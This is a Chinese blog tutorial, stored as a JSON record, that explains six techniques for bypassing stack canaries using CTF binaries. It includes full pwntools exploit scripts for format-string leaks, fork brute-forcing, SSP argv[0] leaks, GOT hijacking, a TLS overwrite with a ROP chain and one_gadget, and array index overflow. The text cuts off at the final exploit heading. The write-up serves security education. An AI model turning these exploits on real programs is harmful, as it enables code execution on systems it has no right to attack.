{"title":"绕过canary的六种方法","uid":"3c52b98d7c3f3c00c8108b428bc990ce","slug":"绕过canary的方法","date":"2021-12-29T12:49:23.000Z","updated":"2021-12-29T10:29:56.048Z","comments":true,"path":"api/articles/绕过canary的方法.json","keywords":null,"cover":"https://s2.loli.net/2021/12/29/hg8E94WFwYpo1RD.jpg","content":"<p><strong><a href=\"https://www.anquanke.com/post/id/262846\">文章首发于安全客</a></strong></p>\n<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>canary保护又称金丝雀保护，作用是为了防止栈溢出的一种保护机制。工作原理是从fs/gs寄存器取值放在rbp-4或者rbp-8的位置（32位/64位），当用户输入结束后，程序会从rbp-4或者rbp-8的位置取出并与fs/gs寄存器对应位置的值进行比较，如果不相等就会执行__ stack_chk_fail函数，这个函数强行停止程序运行并发出警告，从而阻止栈溢出攻击。当然，这种保护并不是万无一失的，下面我将会列举出6种绕过canary的方法，每种方法多少都有一定的限制，具体还是要依据题目来决定采用何种方法。</p>\n<p>下面列举一个64位下的canary保护运行机制：</p>\n<p>程序开启canary保护后，在运行开始会从fs寄存器偏移为0x28的位置中取出8字节放入rax寄存器中，之后rax会将其放在rbp-8的位置，最后将rax的值清零</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/C2oJqAKepRH8BiZ.png\" alt=\"image.png\"></p>\n<p>程序接收我们的输入后会进行检查，如果canary被覆盖就会执行stack_chk_fail函数从而阻止程序继续运行</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/H3vazkQ5iLtGXZ6.png\" alt=\"image.png\"></p>\n<p><img src=\"https://s2.loli.net/2021/12/10/OQK5wqpPRMbArCx.png\" alt=\"image.png\"></p>\n<h1 id=\"leak绕过\"><a href=\"#leak绕过\" class=\"headerlink\" title=\"leak绕过\"></a>leak绕过</h1><p>通过泄露canary来绕过canary，常见的有覆盖掉前面的\\x00让输出函数泄露，还有printf定点泄露。</p>\n<h2 id=\"stackguard1\"><a href=\"#stackguard1\" class=\"headerlink\" title=\"stackguard1\"></a><strong>stackguard1</strong></h2><p>一个简单的64位canary保护程序，gdb调试可以看到一开始程序会从fs寄存器对应的偏移处取值放入rax中，rax会放入rbp-8的位置，最后清零eax</p>\n<p><img src=\"https://i.loli.net/2021/10/22/iMEf48ZNa927yjJ.png\" alt=\"屏幕截图 2021-10-22 195020.png\"></p>\n<p>程序运行到快结束时，会检查canary，首先将canary取出到rcx，rcx会和fs寄存器对应的偏移处取出进行比较，不同就会跳转到__stack_chk_fail@plt位置，强行结束进程并弹出警告</p>\n<p><img src=\"https://i.loli.net/2021/10/22/9yZLESIY7cpKO8r.png\" alt=\"屏幕截图 2021-10-22 195405.png\"></p>\n<p>分析栈结构：缓冲区过后就是canary，所以如果是简单的溢出覆盖返回地址就会覆盖到canary，从而导致程序崩溃。因此，如果要利用栈溢出就一定要绕过canary。所以思路就是先通过输出函数泄露canary的值，之后在覆盖时用泄露的canary值覆盖canary，其它的就覆盖成我们想要的，这样就绕过了canary。</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/6vPba7V3kLoTJNi.png\" alt=\"image.png\"></p>\n<p>通过字符串列表找到bin/sh，找到调用的位置，发现函数canary_protect_me函数里面会调用这个字符串，我们可以利用这个后门函数获取到shell</p>\n<p><img src=\"https://i.loli.net/2021/10/22/aFk6zUoXZ4H983J.png\" alt=\"屏幕截图 2021-10-22 201418.png\"></p>\n<p>继续分析，程序存在两次输入，一次gets输入，一次read输入，中间存在printf函数，可以对任意地址进行泄露</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/TewV1K5HpMalszF.png\" alt=\"image.png\"></p>\n<p>接下来read读取时，允许读取的0x60个字符，但是在0x28处就遇到canary，0x38就是返回地址，明显存在栈溢出</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/GnocUENKTSdXvQV.png\" alt=\"image.png\"></p>\n<p><img src=\"https://s2.loli.net/2021/12/10/UcOmtof3NdDJgl4.png\" alt=\"image.png\"></p>\n<p>所以思路基本就是，先利用第一次输入泄露canary，在第二次输入时绕过canary并修改返回地址到back_door</p>\n<p>因为是gets函数最后会补上\\x00，会终止printf读取，所以无法通过覆盖泄露，但因为是printf输出，所以可以采取格式化字符串漏洞泄露canary<img src=\"https://i.loli.net/2021/10/22/Sc4iJadPK5pWV32.png\" alt=\"屏幕截图 2021-10-22 203619.png\"></p>\n<p>获取gadget</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/pBxn7JROUovqdtA.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">back_door = <span class=\"number\">0x4011d6</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot; ROPgadget --binary stackguard1 --only &quot;&quot;&quot;</span>pop|ret<span class=\"string\">&quot;|grep &quot;</span>rdi<span class=\"string\">&quot; &quot;</span><span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x0401343</span></span><br><span class=\"line\">bin_sh = <span class=\"number\">0x402004</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./stackguard1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;123.57.230.48&#x27;</span>,<span class=\"number\">12344</span>)</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;%11$p&#x27;</span>  <span class=\"comment\"># 泄露canary</span></span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">canary=<span class=\"built_in\">int</span>(p.recv(),<span class=\"number\">16</span>)  <span class=\"comment\"># 接受canary</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> canary</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(canary)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(back_door))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,&#x27;b main&#x27;)</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"one-by-one爆破\"><a href=\"#one-by-one爆破\" class=\"headerlink\" title=\"one by one爆破\"></a>one by one爆破</h1><p>one by one爆破思想是利用fork函数来不断逐字节泄露。这里介绍一下fork函数，fork函数作用是通过系统调用创建一个与原来进程几乎完全相同的进程，这里的相同也包括canary。当程序存在fork函数并触发canary时，__ stack_chk_fail函数只能关闭fork函数所建立的进程，不会让主进程退出，所以当存在大量调用fork函数时，我们可以利用它来一字节一字节的泄露，所以叫做one by one爆破。</p>\n<h2 id=\"bin1\"><a href=\"#bin1\" class=\"headerlink\" title=\"bin1\"></a>bin1</h2><p>程序中存在fork函数，而且还是不断循环，符合one by one爆破条件，因为是32位程序，canary第一个字符是\\x00，所以我们只需要爆破3个字节，这三个字节对应的十六进制码范围为00~FF</p>\n<p><img src=\"https://i.loli.net/2021/10/26/lFXwj8JfDAdoEsZ.png\" alt=\"屏幕截图 2021-10-26 083224.png\"></p>\n<p>爆破原理：</p>\n<p>我们每次尝试多溢出一字节，如果接收到进程错误退出就尝试另一种字符；如果接收到正常返回就继续溢出一字节，直到canary被完全泄露。因为没有远端环境加上没有flag文件，所以是get flag error</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/pfwXaxBKnYVCQGv.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">local = <span class=\"number\">1</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./bin1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> local:</span><br><span class=\"line\">    p = process(<span class=\"string\">&#x27;./bin1&#x27;</span>)</span><br><span class=\"line\">    libc = elf.libc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = remote(<span class=\"string\">&#x27;&#x27;</span>,)</span><br><span class=\"line\">    libc = ELF(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;welcome\\n&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;index &quot;</span> + <span class=\"built_in\">str</span>(k) + <span class=\"string\">&quot;: &quot;</span> + <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">        p.send(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">100</span> + canary + <span class=\"built_in\">chr</span>(i))</span><br><span class=\"line\">        a = p.recvuntil(<span class=\"string\">&quot;welcome\\n&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span> a</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;sucess&quot;</span> <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">                canary += <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">                <span class=\"built_in\">print</span> <span class=\"string\">&quot;canary: &quot;</span> + canary</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">addr = <span class=\"number\">0x0804863B</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">100</span> + canary + <span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">12</span> + p32(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"ssp攻击\"><a href=\"#ssp攻击\" class=\"headerlink\" title=\"ssp攻击\"></a>ssp攻击</h1><p>当程序检测到栈溢出时，程序会执行 __ stack_chk_fail函数，而__ stack_chk_fail函数作用是阻断程序继续执行，并输出argv[0]警告，而ssp攻击原理是通过输入足够长的字符串覆盖掉argv[0]，这样就能让canary保护输出我们想要地址上的值。</p>\n<p><strong>注意：这个方法在glibc2.27及以上的版本中已失效</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__stack_chk_fail (<span class=\"keyword\">void</span>) &#123;</span><br><span class=\"line\">\t__fortify_fail (<span class=\"string\">&quot;stack smashing detected&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__fortify_fail (msg)</span><br><span class=\"line\">   <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *msg; &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* The loop is added only to keep gcc happy. */</span></span><br><span class=\"line\">         <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">              __libc_message (<span class=\"number\">2</span>, <span class=\"string\">&quot;*** %s ***: %s terminated\\n&quot;</span>, msg, __libc_argv[<span class=\"number\">0</span>] ?: <span class=\"string\">&quot;&lt;unknown&gt;&quot;</span>) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (__fortify_fail)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>上面是 stack_chk_fail()函数的源码，在libc_message函数中第二个%s输出的就是__libc_argv[0]，argv[0]是指向第一个启动参数字符串的指针。我们可以利用栈溢出将其覆盖成我们想要泄露的地址，当程序触发到canary时就可以泄露我们想要的东西了。</p>\n<h2 id=\"smashes\"><a href=\"#smashes\" class=\"headerlink\" title=\"smashes\"></a>smashes</h2><p>通过反汇编发现程序会进入一个函数，这个函数中存在gets危险函数，可以利用它进行栈溢出操作。<img src=\"https://i.loli.net/2021/11/15/UrIOTvQfePFLdlj.png\" alt=\"image.png\"></p>\n<p>在字符串窗口发现flag字样，根据提示我们可以知道flag就在这里，不过是在远端环境中<img src=\"https://i.loli.net/2021/11/15/vt1PArjFWlipJY9.png\" alt=\"image.png\"></p>\n<p>所以我们只要将argv[0]指向这个地址就可以泄露。</p>\n<p>但是后面发现行不通，并没有泄露我们想要泄露的地址里面的值。<img src=\"https://i.loli.net/2021/11/15/TZRsh7QgEb5V4Kd.png\" alt=\"image.png\"></p>\n<p>回到伪代码里面发现下面一行</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">memset</span>((<span class=\"keyword\">void</span> *)((<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v0 + <span class=\"number\">0x600D20</span>LL), <span class=\"number\">0</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)(<span class=\"number\">32</span> - v0));</span><br></pre></td></tr></table></figure>\n\n<p>这行代码会将0x600D20这个地址里面的值清空，导致flag被清除。看了一下一些师傅的博客了解到ELF的重映射。<strong>当可执行文件足够小的时候，他的不同区段可能会被多次映射。也就是说该flag会在其他地方进行备份。</strong></p>\n<p><img src=\"https://i.loli.net/2021/11/15/QGDmy4HdWTqeKcz.png\" alt=\"image.png\"></p>\n<p>同时还要注意一点，64位下地址都是8的倍数所以最终我们要泄露的地址是0x400d20</p>\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = &#x27;debug&#x27;</span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;pwn.jarvisoj.com&quot;</span>,<span class=\"number\">9877</span>)</span><br><span class=\"line\">p.recvuntil(&#x27;name? &#x27;)</span><br><span class=\"line\">p.sendline(p64(<span class=\"number\">0x400d20</span>)*<span class=\"number\">300</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"劫持-stack-chk-fail\"><a href=\"#劫持-stack-chk-fail\" class=\"headerlink\" title=\"劫持___stack_chk_fail\"></a>劫持___stack_chk_fail</h1><p>canary保护原理无非就是检测到溢出后调用 __ stack_chk_fail函数，所以如果我们能够修改 __ stack_chk_fail函数的got表为后门函数，当检测溢出调用 __ stack_chk_fail函数后，程序就不会退出并警告而是执行我们的后门函数。</p>\n<h2 id=\"BJDCTF-2nd-r2t4\"><a href=\"#BJDCTF-2nd-r2t4\" class=\"headerlink\" title=\"[BJDCTF 2nd]r2t4\"></a>[BJDCTF 2nd]r2t4</h2><p>进入IDA很容易就发现后门函数</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/VhpjSlIYQkn7KbF.png\" alt=\"image.png\"></p>\n<p>继续分析，程序只存在一次输入输出，但输出却调用printf函数，也就存在格式字符串漏洞，我们可以利用其修改或泄露任意地址</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/bKSDEhdouHgTcUx.png\" alt=\"image.png\"></p>\n<p>找到canry对应的偏移并利用printf修改 __ stack_chk_fail函数的got表</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/UC9hdcIopDPEVqz.png\" alt=\"image.png\"></p>\n<p>最后获得flag</p>\n<p><img src=\"https://s2.loli.net/2021/12/10/Bioh8X2NzuOGKZv.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP-3\"><a href=\"#EXP-3\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./r2t4&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;r2t4&#x27;</span>)</span><br><span class=\"line\">back_door = <span class=\"number\">0x400626</span></span><br><span class=\"line\">__stack_chk_fail_got = elf.got[<span class=\"string\">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class=\"line\">payload = <span class=\"string\">&quot;%64c%9$hn%1510c%10$hnAAA&quot;</span> + p64(__stack_chk_fail_got+<span class=\"number\">2</span>) + p64(__stack_chk_fail_got)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"修改TLS结构体\"><a href=\"#修改TLS结构体\" class=\"headerlink\" title=\"修改TLS结构体\"></a>修改TLS结构体</h1><p>如果我们溢出的足够大，大到能够覆盖到fs/gs寄存器对应偏移位的值，我们就可以修改canary为我们设计好的值，这样在程序检测时就会和我们匹配的值进行检测，从而绕过canary保护。在初始化canary时，fs寄存器指向的位置是TLS结构体，而fs指向的位置加上0x28偏移的位置取出来的canary就在TLS结构体里面。</p>\n<p>TLS结构体如下所示：</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/7dNV3AXJC6ynz2g.png\" alt=\"image.png\"></p>\n<p><img src=\"https://s2.loli.net/2021/12/11/EsNG6xdMYQTBjVS.png\" alt=\"image.png\"></p>\n<h2 id=\"CTF2018-babystack\"><a href=\"#CTF2018-babystack\" class=\"headerlink\" title=\"CTF2018 babystack\"></a>CTF2018 babystack</h2><p>拖进IDA里面</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/PkfG3jSVb6FIJvi.png\" alt=\"image.png\"></p>\n<p>子进程里面先让用户输入要输入的大小，如果大于0x1000就输出返回不进行读取，如果小于等于就进行读取</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/i5YWcHAQaD97rI6.png\" alt=\"image.png\"></p>\n<p>s的大小是0x1010比0x10000小明显存在栈溢出，我们可以从这里溢出到TLS修改canary，接下来就是确定canary的位置</p>\n<p>这里我采取爆破，不断尝试获得canary的位置。先构建好ROP链，控制程序返回到主函数，这样肯定会被检测到异常退出，但是如果我们不断加长ROP链直到覆盖TLS就可以成功执行</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/t5pbuLRJqA6XefV.png\" alt=\"image.png\"></p>\n<p>确定好位置以后就可以开始构造ROP链，泄露地址puts函数的地址，计算出libcbase，最后利用栈迁移，写one_gadget</p>\n<p>获取gadgets</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/M7UkG6wZ1cfToDs.png\" alt=\"image.png\"></p>\n<p>之后构造ROP链</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x1010</span> </span><br><span class=\"line\">payload += p64(fakestack)</span><br><span class=\"line\">payload += p64(pop_rdi_ret)</span><br><span class=\"line\">payload += p64(puts_got)</span><br><span class=\"line\">payload += p64(puts_plt)</span><br><span class=\"line\">payload += p64(pop_rdi_ret)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(pop_rsi_r15_ret)</span><br><span class=\"line\">payload += p64(fakestack)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(read_plt)</span><br><span class=\"line\">payload += p64(leave_ret)</span><br><span class=\"line\">payload += <span class=\"string\">&#x27;a&#x27;</span>*(offset - <span class=\"built_in\">len</span>(payload))</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)输出puts的地址</li>\n<li>p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_r15_ret)+p64(fakestack)+p64(0)+p64(read_plt)组装read函数向fakestack写东西</li>\n</ol>\n<p>获取one_gadget</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/LTidqfcgkxtvQjR.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP-4\"><a href=\"#EXP-4\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./babystack&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;babystack&#x27;</span>)</span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\"></span><br><span class=\"line\">main_addr = <span class=\"number\">0x4009E7</span></span><br><span class=\"line\">offset = <span class=\"number\">6128</span></span><br><span class=\"line\">bss_start = elf.bss()</span><br><span class=\"line\">fakestack = bss_start + <span class=\"number\">0x100</span></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x400c03</span></span><br><span class=\"line\">pop_rsi_r15_ret = <span class=\"number\">0x400c01</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x400955</span></span><br><span class=\"line\">read_plt = elf.symbols[<span class=\"string\">&quot;read&quot;</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">puts_plt = elf.symbols[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">puts_libc = libc.symbols[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">read_plt = elf.symbols[<span class=\"string\">&quot;read&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;send?&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(offset))</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x1010</span> </span><br><span class=\"line\">payload += p64(fakestack)</span><br><span class=\"line\">payload += p64(pop_rdi_ret)</span><br><span class=\"line\">payload += p64(puts_got)</span><br><span class=\"line\">payload += p64(puts_plt)</span><br><span class=\"line\">payload += p64(pop_rdi_ret)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(pop_rsi_r15_ret)</span><br><span class=\"line\">payload += p64(fakestack)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(read_plt)</span><br><span class=\"line\">payload += p64(leave_ret)</span><br><span class=\"line\">payload += <span class=\"string\">&#x27;a&#x27;</span>*(offset - <span class=\"built_in\">len</span>(payload))</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;goodbye.\\n&quot;</span>)</span><br><span class=\"line\">puts_addr = u64(p.recv()[:<span class=\"number\">6</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(puts_addr)</span><br><span class=\"line\">getshell_libc = <span class=\"number\">0x4527a</span> <span class=\"comment\">#0x45226 0x4527a 0xf03a4 0xf1247</span></span><br><span class=\"line\">base_addr = puts_addr - puts_libc</span><br><span class=\"line\">one_gadget = base_addr + getshell_libc</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = p64(<span class=\"number\">0x12345678</span>)</span><br><span class=\"line\">payload2 += p64(one_gadget)</span><br><span class=\"line\">p.send(payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://s2.loli.net/2021/12/11/KPtpvlnfT7X3cIm.png\" alt=\"image.png\"></p>\n<h1 id=\"数组下标越界\"><a href=\"#数组下标越界\" class=\"headerlink\" title=\"数组下标越界\"></a>数组下标越界</h1><p>当程序中存在数组，没有对边界进行检查时，如果我们可以对数组进行对应位置修改，我们就可以绕过canary检测，直接修改返回地址</p>\n<p>例如，我们可以对arr数组任意位置进行修改，这就存在数组下标溢出，以下图为例，返回地址在数组中就相当于arr[6]，如果我们对arr[6]进行修改就是对返回地址进行修改</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/zmgNVKvaqhUBpnl.png\" alt=\"image.png\"></p>\n<h2 id=\"homework\"><a href=\"#homework\" class=\"headerlink\" title=\"homework\"></a>homework</h2><p>直接进IDA里面观察，发现存在后门函数</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/96yP8cAto4dxKpi.png\" alt=\"image.png\"></p>\n<p>继续分析</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/CoN237cMFXpEmvw.png\" alt=\"image.png\"></p>\n<p>这里没有对数组进行检查，我们可以利用它来修改返回地址，接下来就是寻找返回地址对应位置</p>\n<p><img src=\"https://s2.loli.net/2021/12/11/lL3sqS89Ognyoev.png\" alt=\"image.png\"></p>\n<p>所以我们只需要将arr[14]修改成后面函数地址即可拿到shell</p>\n<h2 id=\"EXP-5\"><a href=\"#EXP-5\" 